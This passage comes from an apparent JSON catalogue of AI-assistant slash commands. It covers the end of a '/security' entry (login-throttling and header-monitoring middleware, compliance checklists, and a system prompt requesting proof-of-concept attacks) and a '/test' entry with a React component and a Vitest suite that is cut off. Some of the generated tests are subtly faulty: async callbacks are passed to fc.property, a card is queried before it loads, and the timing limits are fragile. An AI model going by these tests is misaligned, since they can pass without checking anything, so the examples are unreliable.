next();\n};\n\napp.use(securityMonitor);\n\n// Failed login attempt monitoring\nconst loginAttempts = new Map();\n\napp.post('/login', (req, res, next) => {\n  const clientId = req.ip + ':' + req.get('User-Agent');\n  const attempts = loginAttempts.get(clientId) || 0;\n  \n  if (attempts > 10) {\n    securityLogger.error('Potential brute force attack', {\n      ip: req.ip,\n      userAgent: req.get('User-Agent'),\n      attempts: attempts\n    });\n    \n    return res.status(429).json({ error: 'Too many failed attempts' });\n  }\n  \n  // Track failed attempts\n  res.on('finish', () => {\n    if (res.statusCode === 401) {\n      loginAttempts.set(clientId, attempts + 1);\n      setTimeout(() => loginAttempts.delete(clientId), 15 * 60 * 1000);\n    } else if (res.statusCode === 200) {\n      loginAttempts.delete(clientId);\n    }\n  });\n  \n  next();\n});\n\n// Security headers monitoring\napp.use((req, res, next) => {\n  res.on('finish', () => {\n    const securityHeaders = [\n      'X-Content-Type-Options',\n      'X-Frame-Options',\n      'X-XSS-Protection',\n      'Strict-Transport-Security',\n      'Content-Security-Policy'\n    ];\n    \n    const missingHeaders = securityHeaders.filter(header => !res.get(header));\n    \n    if (missingHeaders.length > 0) {\n      securityLogger.warn('Missing security headers', {\n        url: req.originalUrl,\n        missingHeaders: missingHeaders\n      });\n    }\n  });\n  \n  next();\n});\n```\n\n## üéØ Security Compliance Checklist\n\n### ‚úÖ OWASP Top 10 (2021)\n- [ ] A01: Broken Access Control\n- [ ] A02: Cryptographic Failures\n- [ ] A03: Injection\n- [ ] A04: Insecure Design\n- [ ] A05: Security Misconfiguration\n- [ ] A06: Vulnerable and Outdated Components\n- [ ] A07: Identification and Authentication Failures\n- [ ] A08: Software and Data Integrity Failures\n- [ ] A09: Security Logging and Monitoring Failures\n- [ ] A10: Server-Side Request Forgery (SSRF)\n\n### ‚úÖ Data Protection (GDPR/CCPA)\n- [ ] Data encryption at rest and in transit\n- [ ] Personal data inventory and classification\n- [ ] Data retention and deletion policies\n- [ ] User consent management\n- [ ] Data breach notification procedures\n- [ ] Privacy by design implementation\n\n### ‚úÖ Infrastructure Security\n- [ ] Network segmentation and firewalls\n- [ ] Container security and image scanning\n- [ ] Secrets management and rotation\n- [ ] Monitoring and incident response\n- [ ] Backup and disaster recovery\n- [ ] Vulnerability management program\n\nThis security audit provides comprehensive vulnerability assessment with actionable remediation steps and compliance guidance.",
      "configuration": {
        "temperature": 0.1,
        "maxTokens": 16000,
        "systemPrompt": "You are a cybersecurity expert specializing in application security, penetration testing, and compliance. Provide detailed vulnerability analysis with proof-of-concept attacks and comprehensive remediation strategies."
      },
      "githubUrl": "https://github.com/claudepro/security-auditor",
      "documentationUrl": "https://docs.claude.ai/commands/security",
      "source": "community",
      "slug": "security",
      "type": "command",
      "url": "https://claudepro.directory/commands/security"
    },
    {
      "title": "/test",
      "description": "Advanced test suite generator with property-based testing, mutation testing, and intelligent test case discovery",
      "category": "commands",
      "author": "claudepro",
      "dateAdded": "2025-09-16",
      "tags": [
        "testing",
        "unit-tests",
        "integration-tests",
        "property-based",
        "mutation-testing"
      ],
      "content": "The `/test` command generates comprehensive test suites with advanced testing methodologies including property-based testing, mutation testing, snapshot testing, and intelligent edge case discovery.\n\n## Usage\n\n```\n/test [options] <file_or_function>\n```\n\n## Options\n\n### Test Types\n- `--unit` - Unit tests with mocking and isolation\n- `--integration` - Integration tests with real dependencies\n- `--e2e` - End-to-end tests with full system simulation\n- `--property` - Property-based testing with hypothesis generation\n- `--mutation` - Mutation testing for test quality assessment\n- `--snapshot` - Snapshot testing for UI and output consistency\n- `--performance` - Performance and load testing\n- `--security` - Security and penetration testing\n- `--all` - Comprehensive test suite (default)\n\n### Testing Frameworks\n- `--jest` - Jest testing framework (JavaScript/TypeScript)\n- `--vitest` - Vitest testing framework (faster Jest alternative)\n- `--pytest` - pytest framework (Python)\n- `--junit` - JUnit framework (Java)\n- `--rspec` - RSpec framework (Ruby)\n- `--go-test` - Go testing package\n- `--rust-test` - Rust testing framework\n\n### Advanced Features\n- `--coverage` - Generate code coverage reports with detailed metrics\n- `--baseline` - Generate performance baselines and regression detection\n- `--fuzz` - Fuzzing tests with random input generation\n- `--contract` - Contract testing for API compatibility\n- `--visual` - Visual regression testing for UI components\n\n### AI-Powered Features\n- `--smart-cases` - AI-generated edge cases and corner cases\n- `--behavior-discovery` - Automatic behavior pattern recognition\n- `--test-oracle` - AI-powered test oracle generation\n- `--failure-prediction` - Predict likely failure scenarios\n\n## Examples\n\n### Advanced React Component Testing\n\n```jsx\n// Component to test: UserProfileCard.jsx\nimport React, { useState, useEffect } from 'react';\nimport { fetchUserProfile, updateUserProfile } from '../api/users';\nimport { useAuth } from '../hooks/useAuth';\nimport { toast } from '../utils/toast';\n\nconst UserProfileCard = ({ userId, onProfileUpdate, editable = false }) => {\n  const [profile, setProfile] = useState(null);\n  const [loading, setLoading] = useState(true);\n  const [editing, setEditing] = useState(false);\n  const [formData, setFormData] = useState({});\n  const [errors, setErrors] = useState({});\n  \n  const { user: currentUser } = useAuth();\n  \n  useEffect(() => {\n    loadProfile();\n  }, [userId]);\n  \n  const loadProfile = async () => {\n    try {\n      setLoading(true);\n      const userProfile = await fetchUserProfile(userId);\n      setProfile(userProfile);\n      setFormData({\n        name: userProfile.name,\n        email: userProfile.email,\n        bio: userProfile.bio || ''\n      });\n    } catch (error) {\n      toast.error('Failed to load profile');\n    } finally {\n      setLoading(false);\n    }\n  };\n  \n  const validateForm = () => {\n    const newErrors = {};\n    \n    if (!formData.name?.trim()) {\n      newErrors.name = 'Name is required';\n    } else if (formData.name.length < 2) {\n      newErrors.name = 'Name must be at least 2 characters';\n    } else if (formData.name.length > 100) {\n      newErrors.name = 'Name must be less than 100 characters';\n    }\n    \n    if (!formData.email?.trim()) {\n      newErrors.email = 'Email is required';\n    } else if (!/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(formData.email)) {\n      newErrors.email = 'Invalid email format';\n    }\n    \n    if (formData.bio && formData.bio.length > 500) {\n      newErrors.bio = 'Bio must be less than 500 characters';\n    }\n    \n    setErrors(newErrors);\n    return Object.keys(newErrors).length === 0;\n  };\n  \n  const handleSave = async () => {\n    if (!validateForm()) return;\n    \n    try {\n      setLoading(true);\n      const updatedProfile = await updateUserProfile(userId, formData);\n      setProfile(updatedProfile);\n      setEditing(false);\n      toast.success('Profile updated successfully');\n      onProfileUpdate?.(updatedProfile);\n    } catch (error) {\n      if (error.status === 409) {\n        setErrors({ email: 'Email already exists' });\n      } else {\n        toast.error('Failed to update profile');\n      }\n    } finally {\n      setLoading(false);\n    }\n  };\n  \n  const canEdit = editable && (currentUser?.id === userId || currentUser?.role === 'admin');\n  \n  if (loading && !profile) {\n    return <div data-testid=\"loading-spinner\">Loading...</div>;\n  }\n  \n  if (!profile) {\n    return <div data-testid=\"error-message\">Profile not found</div>;\n  }\n  \n  return (\n    <div data-testid=\"user-profile-card\" className=\"profile-card\">\n      <div className=\"profile-header\">\n        <img \n          src={profile.avatar || '/default-avatar.png'} \n          alt={`${profile.name}'s avatar`}\n          data-testid=\"profile-avatar\"\n        />\n        {editing ? (\n          <input\n            type=\"text\"\n            value={formData.name}\n            onChange={(e) => setFormData(prev => ({ ...prev, name: e.target.value }))}\n            data-testid=\"name-input\"\n            className={errors.name ? 'error' : ''}\n            placeholder=\"Enter name\"\n          />\n        ) : (\n          <h2 data-testid=\"profile-name\">{profile.name}</h2>\n        )}\n        {errors.name && <span data-testid=\"name-error\" className=\"error\">{errors.name}</span>}\n      </div>\n      \n      <div className=\"profile-details\">\n        <div className=\"detail-item\">\n          <label>Email:</label>\n          {editing ? (\n            <input\n              type=\"email\"\n              value={formData.email}\n              onChange={(e) => setFormData(prev => ({ ...prev, email: e.target.value }))}\n              data-testid=\"email-input\"\n              className={errors.email ? 'error' : ''}\n            />\n          ) : (\n            <span data-testid=\"profile-email\">{profile.email}</span>\n          )}\n          {errors.email && <span data-testid=\"email-error\" className=\"error\">{errors.email}</span>}\n        </div>\n        \n        <div className=\"detail-item\">\n          <label>Bio:</label>\n          {editing ? (\n            <textarea\n              value={formData.bio}\n              onChange={(e) => setFormData(prev => ({ ...prev, bio: e.target.value }))}\n              data-testid=\"bio-input\"\n              className={errors.bio ? 'error' : ''}\n              placeholder=\"Tell us about yourself...\"\n              maxLength={500}\n            />\n          ) : (\n            <p data-testid=\"profile-bio\">{profile.bio || 'No bio available'}</p>\n          )}\n          {errors.bio && <span data-testid=\"bio-error\" className=\"error\">{errors.bio}</span>}\n        </div>\n      </div>\n      \n      {canEdit && (\n        <div className=\"profile-actions\">\n          {editing ? (\n            <>\n              <button\n                onClick={handleSave}\n                disabled={loading}\n                data-testid=\"save-button\"\n                className=\"btn-primary\"\n              >\n                {loading ? 'Saving...' : 'Save Changes'}\n              </button>\n              <button\n                onClick={() => {\n                  setEditing(false);\n                  setFormData({\n                    name: profile.name,\n                    email: profile.email,\n                    bio: profile.bio || ''\n                  });\n                  setErrors({});\n                }}\n                disabled={loading}\n                data-testid=\"cancel-button\"\n                className=\"btn-secondary\"\n              >\n                Cancel\n              </button>\n            </>\n          ) : (\n            <button\n              onClick={() => setEditing(true)}\n              data-testid=\"edit-button\"\n              className=\"btn-primary\"\n            >\n              Edit Profile\n            </button>\n          )}\n        </div>\n      )}\n    </div>\n  );\n};\n\nexport default UserProfileCard;\n```\n\n**Generated Advanced Test Suite:**\n\n```javascript\n// UserProfileCard.test.jsx - Comprehensive Test Suite\nimport React from 'react';\nimport { render, screen, fireEvent, waitFor, within } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport { vi, describe, it, expect, beforeEach, afterEach } from 'vitest';\nimport { faker } from '@faker-js/faker';\nimport fc from 'fast-check';\nimport { axe, toHaveNoViolations } from 'jest-axe';\n\nimport UserProfileCard from '../UserProfileCard';\nimport { fetchUserProfile, updateUserProfile } from '../api/users';\nimport { useAuth } from '../hooks/useAuth';\nimport { toast } from '../utils/toast';\n\n// Extend Jest matchers\nexpect.extend(toHaveNoViolations);\n\n// Mock dependencies\nvi.mock('../api/users');\nvi.mock('../hooks/useAuth');\nvi.mock('../utils/toast');\n\nconst mockFetchUserProfile = vi.mocked(fetchUserProfile);\nconst mockUpdateUserProfile = vi.mocked(updateUserProfile);\nconst mockUseAuth = vi.mocked(useAuth);\nconst mockToast = vi.mocked(toast);\n\n// Test data generators\nconst generateValidUser = () => ({\n  id: faker.string.uuid(),\n  name: faker.person.fullName(),\n  email: faker.internet.email(),\n  bio: faker.lorem.paragraph(),\n  avatar: faker.image.avatar(),\n  createdAt: faker.date.past().toISOString(),\n  updatedAt: faker.date.recent().toISOString()\n});\n\nconst generateInvalidUser = () => ({\n  id: '',\n  name: '',\n  email: 'invalid-email',\n  bio: 'x'.repeat(600), // Exceeds 500 char limit\n  avatar: null\n});\n\n// Custom render function with providers\nconst renderUserProfileCard = (props = {}) => {\n  const defaultProps = {\n    userId: faker.string.uuid(),\n    editable: false,\n    onProfileUpdate: vi.fn(),\n    ...props\n  };\n  \n  return {\n    ...render(<UserProfileCard {...defaultProps} />),\n    props: defaultProps\n  };\n};\n\ndescribe('UserProfileCard', () => {\n  let mockCurrentUser;\n  \n  beforeEach(() => {\n    vi.clearAllMocks();\n    \n    // Default auth state\n    mockCurrentUser = generateValidUser();\n    mockUseAuth.mockReturnValue({ user: mockCurrentUser });\n    \n    // Default toast implementation\n    mockToast.success = vi.fn();\n    mockToast.error = vi.fn();\n  });\n  \n  afterEach(() => {\n    vi.restoreAllMocks();\n  });\n  \n  describe('Loading States', () => {\n    it('should show loading spinner while fetching profile', () => {\n      mockFetchUserProfile.mockImplementation(() => new Promise(() => {})); // Never resolves\n      \n      renderUserProfileCard();\n      \n      expect(screen.getByTestId('loading-spinner')).toBeInTheDocument();\n      expect(screen.getByText('Loading...')).toBeInTheDocument();\n    });\n    \n    it('should show loading button text while saving', async () => {\n      const user = userEvent.setup();\n      const mockProfile = generateValidUser();\n      \n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      mockUpdateUserProfile.mockImplementation(() => new Promise(() => {})); // Never resolves\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-name')).toHaveTextContent(mockProfile.name);\n      });\n      \n      await user.click(screen.getByTestId('edit-button'));\n      await user.click(screen.getByTestId('save-button'));\n      \n      expect(screen.getByTestId('save-button')).toHaveTextContent('Saving...');\n      expect(screen.getByTestId('save-button')).toBeDisabled();\n      expect(screen.getByTestId('cancel-button')).toBeDisabled();\n    });\n  });\n  \n  describe('Profile Display', () => {\n    it('should display profile information correctly', async () => {\n      const mockProfile = generateValidUser();\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ userId: mockProfile.id });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-name')).toHaveTextContent(mockProfile.name);\n      });\n      \n      expect(screen.getByTestId('profile-email')).toHaveTextContent(mockProfile.email);\n      expect(screen.getByTestId('profile-bio')).toHaveTextContent(mockProfile.bio);\n      expect(screen.getByTestId('profile-avatar')).toHaveAttribute('src', mockProfile.avatar);\n      expect(screen.getByTestId('profile-avatar')).toHaveAttribute('alt', `${mockProfile.name}'s avatar`);\n    });\n    \n    it('should display default avatar when user has no avatar', async () => {\n      const mockProfile = { ...generateValidUser(), avatar: null };\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ userId: mockProfile.id });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-avatar')).toHaveAttribute('src', '/default-avatar.png');\n      });\n    });\n    \n    it('should display \"No bio available\" when user has no bio', async () => {\n      const mockProfile = { ...generateValidUser(), bio: null };\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ userId: mockProfile.id });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-bio')).toHaveTextContent('No bio available');\n      });\n    });\n  });\n  \n  describe('Error Handling', () => {\n    it('should show error message when profile fetch fails', async () => {\n      const errorMessage = 'Network error';\n      mockFetchUserProfile.mockRejectedValue(new Error(errorMessage));\n      \n      renderUserProfileCard();\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('error-message')).toBeInTheDocument();\n      });\n      \n      expect(mockToast.error).toHaveBeenCalledWith('Failed to load profile');\n    });\n    \n    it('should handle API errors during profile update', async () => {\n      const user = userEvent.setup();\n      const mockProfile = generateValidUser();\n      \n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      mockUpdateUserProfile.mockRejectedValue(new Error('Server error'));\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n      \n      await user.click(screen.getByTestId('edit-button'));\n      await user.clear(screen.getByTestId('name-input'));\n      await user.type(screen.getByTestId('name-input'), 'Updated Name');\n      await user.click(screen.getByTestId('save-button'));\n      \n      await waitFor(() => {\n        expect(mockToast.error).toHaveBeenCalledWith('Failed to update profile');\n      });\n    });\n    \n    it('should handle email conflict error specifically', async () => {\n      const user = userEvent.setup();\n      const mockProfile = generateValidUser();\n      const conflictError = new Error('Conflict');\n      conflictError.status = 409;\n      \n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      mockUpdateUserProfile.mockRejectedValue(conflictError);\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n      \n      await user.click(screen.getByTestId('edit-button'));\n      await user.clear(screen.getByTestId('email-input'));\n      await user.type(screen.getByTestId('email-input'), 'existing@example.com');\n      await user.click(screen.getByTestId('save-button'));\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('email-error')).toHaveTextContent('Email already exists');\n      });\n    });\n  });\n  \n  describe('Permission System', () => {\n    it('should show edit button for profile owner', async () => {\n      const mockProfile = { ...generateValidUser(), id: mockCurrentUser.id };\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n    });\n    \n    it('should show edit button for admin users', async () => {\n      const mockProfile = generateValidUser();\n      const adminUser = { ...mockCurrentUser, role: 'admin' };\n      \n      mockUseAuth.mockReturnValue({ user: adminUser });\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n    });\n    \n    it('should not show edit button for other users', async () => {\n      const mockProfile = generateValidUser();\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-name')).toBeInTheDocument();\n      });\n      \n      expect(screen.queryByTestId('edit-button')).not.toBeInTheDocument();\n    });\n    \n    it('should not show edit button when editable is false', async () => {\n      const mockProfile = { ...generateValidUser(), id: mockCurrentUser.id };\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: false \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-name')).toBeInTheDocument();\n      });\n      \n      expect(screen.queryByTestId('edit-button')).not.toBeInTheDocument();\n    });\n  });\n  \n  describe('Form Validation', () => {\n    beforeEach(async () => {\n      const mockProfile = { ...generateValidUser(), id: mockCurrentUser.id };\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n      \n      await userEvent.setup().click(screen.getByTestId('edit-button'));\n    });\n    \n    it('should validate required name field', async () => {\n      const user = userEvent.setup();\n      \n      await user.clear(screen.getByTestId('name-input'));\n      await user.click(screen.getByTestId('save-button'));\n      \n      expect(screen.getByTestId('name-error')).toHaveTextContent('Name is required');\n      expect(mockUpdateUserProfile).not.toHaveBeenCalled();\n    });\n    \n    it('should validate minimum name length', async () => {\n      const user = userEvent.setup();\n      \n      await user.clear(screen.getByTestId('name-input'));\n      await user.type(screen.getByTestId('name-input'), 'A');\n      await user.click(screen.getByTestId('save-button'));\n      \n      expect(screen.getByTestId('name-error')).toHaveTextContent('Name must be at least 2 characters');\n    });\n    \n    it('should validate maximum name length', async () => {\n      const user = userEvent.setup();\n      const longName = 'A'.repeat(101);\n      \n      await user.clear(screen.getByTestId('name-input'));\n      await user.type(screen.getByTestId('name-input'), longName);\n      await user.click(screen.getByTestId('save-button'));\n      \n      expect(screen.getByTestId('name-error')).toHaveTextContent('Name must be less than 100 characters');\n    });\n    \n    it('should validate required email field', async () => {\n      const user = userEvent.setup();\n      \n      await user.clear(screen.getByTestId('email-input'));\n      await user.click(screen.getByTestId('save-button'));\n      \n      expect(screen.getByTestId('email-error')).toHaveTextContent('Email is required');\n    });\n    \n    it('should validate email format', async () => {\n      const user = userEvent.setup();\n      \n      await user.clear(screen.getByTestId('email-input'));\n      await user.type(screen.getByTestId('email-input'), 'invalid-email');\n      await user.click(screen.getByTestId('save-button'));\n      \n      expect(screen.getByTestId('email-error')).toHaveTextContent('Invalid email format');\n    });\n    \n    it('should validate bio length', async () => {\n      const user = userEvent.setup();\n      const longBio = 'A'.repeat(501);\n      \n      await user.clear(screen.getByTestId('bio-input'));\n      await user.type(screen.getByTestId('bio-input'), longBio);\n      await user.click(screen.getByTestId('save-button'));\n      \n      expect(screen.getByTestId('bio-error')).toHaveTextContent('Bio must be less than 500 characters');\n    });\n    \n    it('should allow empty bio', async () => {\n      const user = userEvent.setup();\n      const updatedProfile = generateValidUser();\n      \n      mockUpdateUserProfile.mockResolvedValue(updatedProfile);\n      \n      await user.clear(screen.getByTestId('bio-input'));\n      await user.click(screen.getByTestId('save-button'));\n      \n      expect(screen.queryByTestId('bio-error')).not.toBeInTheDocument();\n      expect(mockUpdateUserProfile).toHaveBeenCalled();\n    });\n  });\n  \n  describe('Edit Mode Functionality', () => {\n    let mockProfile;\n    \n    beforeEach(async () => {\n      mockProfile = { ...generateValidUser(), id: mockCurrentUser.id };\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n    });\n    \n    it('should switch to edit mode when edit button is clicked', async () => {\n      const user = userEvent.setup();\n      \n      await user.click(screen.getByTestId('edit-button'));\n      \n      expect(screen.getByTestId('name-input')).toHaveValue(mockProfile.name);\n      expect(screen.getByTestId('email-input')).toHaveValue(mockProfile.email);\n      expect(screen.getByTestId('bio-input')).toHaveValue(mockProfile.bio);\n      expect(screen.getByTestId('save-button')).toBeInTheDocument();\n      expect(screen.getByTestId('cancel-button')).toBeInTheDocument();\n      expect(screen.queryByTestId('edit-button')).not.toBeInTheDocument();\n    });\n    \n    it('should cancel edit mode and restore original values', async () => {\n      const user = userEvent.setup();\n      \n      await user.click(screen.getByTestId('edit-button'));\n      \n      // Make changes\n      await user.clear(screen.getByTestId('name-input'));\n      await user.type(screen.getByTestId('name-input'), 'Changed Name');\n      \n      // Cancel\n      await user.click(screen.getByTestId('cancel-button'));\n      \n      expect(screen.getByTestId('profile-name')).toHaveTextContent(mockProfile.name);\n      expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      expect(screen.queryByTestId('save-button')).not.toBeInTheDocument();\n    });\n    \n    it('should save changes and exit edit mode', async () => {\n      const user = userEvent.setup();\n      const updatedProfile = {\n        ...mockProfile,\n        name: 'Updated Name',\n        email: 'updated@example.com'\n      };\n      \n      mockUpdateUserProfile.mockResolvedValue(updatedProfile);\n      \n      await user.click(screen.getByTestId('edit-button'));\n      \n      await user.clear(screen.getByTestId('name-input'));\n      await user.type(screen.getByTestId('name-input'), updatedProfile.name);\n      \n      await user.clear(screen.getByTestId('email-input'));\n      await user.type(screen.getByTestId('email-input'), updatedProfile.email);\n      \n      await user.click(screen.getByTestId('save-button'));\n      \n      await waitFor(() => {\n        expect(mockUpdateUserProfile).toHaveBeenCalledWith(mockProfile.id, {\n          name: updatedProfile.name,\n          email: updatedProfile.email,\n          bio: mockProfile.bio\n        });\n      });\n      \n      expect(mockToast.success).toHaveBeenCalledWith('Profile updated successfully');\n      expect(screen.getByTestId('profile-name')).toHaveTextContent(updatedProfile.name);\n      expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n    });\n  });\n  \n  describe('Callback Functions', () => {\n    it('should call onProfileUpdate callback after successful save', async () => {\n      const user = userEvent.setup();\n      const mockProfile = { ...generateValidUser(), id: mockCurrentUser.id };\n      const updatedProfile = { ...mockProfile, name: 'Updated Name' };\n      const mockOnProfileUpdate = vi.fn();\n      \n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      mockUpdateUserProfile.mockResolvedValue(updatedProfile);\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true,\n        onProfileUpdate: mockOnProfileUpdate\n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n      \n      await user.click(screen.getByTestId('edit-button'));\n      await user.clear(screen.getByTestId('name-input'));\n      await user.type(screen.getByTestId('name-input'), updatedProfile.name);\n      await user.click(screen.getByTestId('save-button'));\n      \n      await waitFor(() => {\n        expect(mockOnProfileUpdate).toHaveBeenCalledWith(updatedProfile);\n      });\n    });\n    \n    it('should not call onProfileUpdate callback on save failure', async () => {\n      const user = userEvent.setup();\n      const mockProfile = { ...generateValidUser(), id: mockCurrentUser.id };\n      const mockOnProfileUpdate = vi.fn();\n      \n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      mockUpdateUserProfile.mockRejectedValue(new Error('Save failed'));\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true,\n        onProfileUpdate: mockOnProfileUpdate\n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n      \n      await user.click(screen.getByTestId('edit-button'));\n      await user.click(screen.getByTestId('save-button'));\n      \n      await waitFor(() => {\n        expect(mockToast.error).toHaveBeenCalled();\n      });\n      \n      expect(mockOnProfileUpdate).not.toHaveBeenCalled();\n    });\n  });\n  \n  describe('Accessibility', () => {\n    it('should have no accessibility violations', async () => {\n      const mockProfile = generateValidUser();\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      const { container } = renderUserProfileCard({ userId: mockProfile.id });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-name')).toBeInTheDocument();\n      });\n      \n      const results = await axe(container);\n      expect(results).toHaveNoViolations();\n    });\n    \n    it('should have proper ARIA labels and roles', async () => {\n      const mockProfile = generateValidUser();\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ userId: mockProfile.id, editable: true });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n      \n      const avatar = screen.getByTestId('profile-avatar');\n      expect(avatar).toHaveAttribute('alt', `${mockProfile.name}'s avatar`);\n      \n      await userEvent.setup().click(screen.getByTestId('edit-button'));\n      \n      const nameInput = screen.getByTestId('name-input');\n      expect(nameInput).toHaveAttribute('placeholder', 'Enter name');\n      \n      const bioInput = screen.getByTestId('bio-input');\n      expect(bioInput).toHaveAttribute('placeholder', 'Tell us about yourself...');\n      expect(bioInput).toHaveAttribute('maxLength', '500');\n    });\n  });\n  \n  describe('Property-Based Testing', () => {\n    it('should handle any valid user profile data', () => {\n      fc.assert(\n        fc.property(\n          fc.record({\n            id: fc.string({ minLength: 1 }),\n            name: fc.string({ minLength: 2, maxLength: 100 }),\n            email: fc.emailAddress(),\n            bio: fc.option(fc.string({ maxLength: 500 }), { nil: undefined }),\n            avatar: fc.option(fc.webUrl(), { nil: undefined })\n          }),\n          (profile) => {\n            mockFetchUserProfile.mockResolvedValue(profile);\n            \n            const { unmount } = renderUserProfileCard({ userId: profile.id });\n            \n            // Should not throw any errors\n            expect(() => {\n              screen.getByTestId('user-profile-card');\n            }).not.toThrow();\n            \n            unmount();\n          }\n        ),\n        { numRuns: 100 }\n      );\n    });\n    \n    it('should validate form inputs with random invalid data', () => {\n      fc.assert(\n        fc.property(\n          fc.record({\n            name: fc.oneof(\n              fc.constant(''), // Empty string\n              fc.string({ minLength: 1, maxLength: 1 }), // Too short\n              fc.string({ minLength: 101, maxLength: 200 }), // Too long\n            ),\n            email: fc.oneof(\n              fc.constant(''), // Empty string\n              fc.string().filter(s => !s.includes('@')), // Invalid format\n              fc.string().map(s => s + '@'), // Incomplete email\n            ),\n            bio: fc.string({ minLength: 501, maxLength: 1000 }) // Too long\n          }),\n          async (invalidData) => {\n            const mockProfile = { ...generateValidUser(), id: mockCurrentUser.id };\n            mockFetchUserProfile.mockResolvedValue(mockProfile);\n            \n            const { unmount } = renderUserProfileCard({ \n              userId: mockProfile.id, \n              editable: true \n            });\n            \n            await waitFor(() => {\n              expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n            });\n            \n            const user = userEvent.setup();\n            await user.click(screen.getByTestId('edit-button'));\n            \n            // Fill form with invalid data\n            await user.clear(screen.getByTestId('name-input'));\n            await user.type(screen.getByTestId('name-input'), invalidData.name);\n            \n            await user.clear(screen.getByTestId('email-input'));\n            await user.type(screen.getByTestId('email-input'), invalidData.email);\n            \n            await user.clear(screen.getByTestId('bio-input'));\n            await user.type(screen.getByTestId('bio-input'), invalidData.bio);\n            \n            await user.click(screen.getByTestId('save-button'));\n            \n            // Should show validation errors\n            expect(\n              screen.queryByTestId('name-error') ||\n              screen.queryByTestId('email-error') ||\n              screen.queryByTestId('bio-error')\n            ).toBeInTheDocument();\n            \n            // Should not call update API\n            expect(mockUpdateUserProfile).not.toHaveBeenCalled();\n            \n            unmount();\n          }\n        ),\n        { numRuns: 50 }\n      );\n    });\n  });\n  \n  describe('Performance Testing', () => {\n    it('should render within performance budget', async () => {\n      const mockProfile = generateValidUser();\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      const startTime = performance.now();\n      \n      renderUserProfileCard({ userId: mockProfile.id });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('profile-name')).toBeInTheDocument();\n      });\n      \n      const endTime = performance.now();\n      const renderTime = endTime - startTime;\n      \n      // Should render within 100ms\n      expect(renderTime).toBeLessThan(100);\n    });\n    \n    it('should handle rapid state changes without performance degradation', async () => {\n      const mockProfile = { ...generateValidUser(), id: mockCurrentUser.id };\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      mockUpdateUserProfile.mockResolvedValue(mockProfile);\n      \n      renderUserProfileCard({ \n        userId: mockProfile.id, \n        editable: true \n      });\n      \n      await waitFor(() => {\n        expect(screen.getByTestId('edit-button')).toBeInTheDocument();\n      });\n      \n      const user = userEvent.setup();\n      const startTime = performance.now();\n      \n      // Rapid edit mode toggling\n      for (let i = 0; i < 10; i++) {\n        await user.click(screen.getByTestId('edit-button'));\n        await user.click(screen.getByTestId('cancel-button'));\n      }\n      \n      const endTime = performance.now();\n      const totalTime = endTime - startTime;\n      \n      // Should complete all operations within 500ms\n      expect(totalTime).toBeLessThan(500);\n    });\n  });\n  \n  describe('Visual Regression Testing', () => {\n    it('should match visual snapshot in display mode', async () => {\n      const mockProfile = generateValidUser();\n      mockFetchUserProfile.mockResolvedValue(mockProfile);\n      \n      const { container } = 